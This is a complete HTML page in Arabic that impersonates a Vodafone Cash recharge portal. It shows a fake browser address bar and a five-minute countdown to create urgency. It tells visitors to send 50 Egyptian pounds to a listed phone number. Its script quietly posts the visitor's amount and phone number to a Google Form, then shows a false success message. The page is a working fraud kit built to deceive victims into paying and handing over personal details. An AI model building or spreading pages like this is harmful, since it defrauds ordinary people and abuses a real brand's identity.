<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vodafone Cash Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        /* تنسيق أساسي للصفحة بالكامل */
        body {
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 50px;
            margin: 0;
            font-family: 'Cairo', sans-serif;
            color: #f0f0f0;
            min-height: 100vh;
        }

        /* تنسيق العداد التنازلي */
        #timer {
            color: #ccc;
            font-size: 16px;
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }

        .portal-container {
            background-color: #1a1a1a;
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.7);
            padding-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .mock-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background-color: #121212;
            border-bottom: 1px solid #333;
            font-size: 14px;
            color: #999;
        }

        .close-icon, .menu-icon {
            font-size: 24px;
            cursor: pointer;
            color: #ccc;
            font-weight: bold;
        }
        .menu-icon {
            font-size: 18px;
            line-height: 10px;
        }
        .url-text {
            flex-grow: 1;
            text-align: center;
            margin: 0 10px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }

        .portal-content {
            padding: 20px;
            text-align: center;
        }

        .vodafone-cash-title {
            color: #e60000;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .recharge-portal-text {
            color: #aaaaaa;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .cash-info {
            color: #f0f0f0;
            font-size: 16px;
            margin-bottom: 30px;
            padding: 10px 0;
            border-bottom: 1px solid #333;
            border-top: 1px solid #333;
        }

        /* حقول الإدخال */
        input {
            width: 100%;
            padding: 18px;
            margin-bottom: 20px;
            border: none;
            background-color: #2b2b2b;
            color: #f0f0f0;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: right;
        }

        input::placeholder {
            color: #888888;
            text-align: right;
        }

        /* زر Verify Payment */
        .verify-button {
            width: 100%;
            background-color: #e60000;
            color: white;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        .verify-button:hover {
            background-color: #cc0000;
        }
        
        /* تنسيق رسالة التأكيد المخفية */
        #confirmation-message {
            background-color: #28a745;
            color: white;
            padding: 20px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            margin-top: 20px;
            display: none; /* يتم إظهارها بواسطة JavaScript */
            text-align: center;
        }

        .help-icon-mock {
            position: absolute;
            bottom: 25px;
            left: 25px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #e60000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            font-weight: 700;
            cursor: help;
        }
    </style>
    </head>
<body>
    <div class="portal-container">
        <div class="mock-header">
            <span class="close-icon" onclick="window.location.reload()">&times;</span>
            <span class="url-text">tgapi.org/Vodafone/Vodafone.ph...</span>
            <div class="menu-icon">...</div>
        </div>

        <div class="portal-content">
            <h1 class="vodafone-cash-title">Vodafone Cash</h1>
            <p class="recharge-portal-text">Recharge Portal</p>
            
            <div id="timer">
                <span style="color: #e60000; font-weight: bold;">تنبيه:</span> 
                هذا العرض ينتهي خلال 
                <span id="countdown">04:59</span>
            </div>

            <p class="cash-info">
                01104973142 ارسل 50 جنيه مصري للأستلام
            </p>

            <div id="confirmation-message">
                ✅ تم تسجيل طلبك بنجاح، جارٍ مراجعة تفاصيل الإرسال.
            </div>

            <form id="paymentForm" action="https://docs.google.com/forms/d/e/1FAIpQLScT-SKLy0cyzkY7ELMIjCkR8dhaNqIqlLi_RfQpJDPKVMe7mg/formResponse" method="POST">
                
                <input type="number" id="egp_amount" name="entry.309063229" placeholder="مبلغ الإرسال (مثال: 50)" required>

                <input type="number" id="sender_number" name="entry.1351187425" placeholder="رقم المرسل (مثال: 010411223)" required>
                
                <button type="submit" class="verify-button">التحقق من الدفع</button>
            </form>
        </div>
        
        <div class="help-icon-mock">
            ?
        </div>
    </div>

    <script>
        // -------------------------
        // 1. نظام رسالة التأكيد الداخلية
        // -------------------------
        document.getElementById('paymentForm').addEventListener('submit', function(event) {
            // منع الإرسال الافتراضي إلى صفحة جوجل المنبثقة
            event.preventDefault(); 

            const form = event.target;
            const formData = new FormData(form);
            
            // استخدام Fetch API لإرسال البيانات في الخلفية
            fetch(form.action, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // مهم لإرسال نماذج جوجل دون خطأ
            })
            .then(() => {
                // إخفاء النموذج وإظهار رسالة التأكيد
                document.getElementById('paymentForm').style.display = 'none';
                document.getElementById('confirmation-message').style.display = 'block';
                document.getElementById('timer').style.display = 'none'; // إخفاء العداد بعد الإرسال

                // تحديث الـ cash info
                document.querySelector('.cash-info').innerHTML = '✅ تم تأكيد استلام الطلب. يرجى الانتظار بضع دقائق.';
            })
            .catch(error => {
                // رسالة خطأ بسيطة في حالة فشل الإرسال
                alert('عفواً، حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
                console.error('Error submitting form:', error);
            });
        });

        // -------------------------
        // 2. نظام العداد التنازلي
        // -------------------------
        let timeInSeconds = 5 * 60; // 5 دقائق

        function updateCountdown() {
            const countdownElement = document.getElementById('countdown');
            if (!countdownElement) return;

            const minutes = Math.floor(timeInSeconds / 60);
            const seconds = timeInSeconds % 60;

            // تنسيق الوقت ليظهر "04:59"
            countdownElement.textContent = 
                `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

            if (timeInSeconds <= 0) {
                // عندما ينتهي العداد
                clearInterval(timerInterval);
                countdownElement.textContent = 'انتهى!';
                document.querySelector('.verify-button').disabled = true;
                document.querySelector('.verify-button').textContent = 'انتهى العرض!';
            } else {
                timeInSeconds--;
            }
        }

        // بدء العداد كل ثانية
        const timerInterval = setInterval(updateCountdown, 1000);

        // تحديث العداد فوراً عند تحميل الصفحة لتجنب التأخير
        updateCountdown(); 
    </script>
</body>
</html>
